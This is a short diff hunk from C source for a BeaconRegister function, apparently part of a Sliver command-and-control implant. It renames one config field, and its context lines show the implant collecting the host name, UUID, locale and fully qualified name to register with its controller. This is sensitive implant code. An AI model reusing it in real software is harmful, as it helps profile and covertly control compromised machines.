@@ -218,7 +218,7 @@ BOOL BeaconRegister
 	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
-	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->szSliverName, lstrlenA(pBeacon->pGlobalConfig->szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->lpSliverName, lstrlenA(pBeacon->pGlobalConfig->lpSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
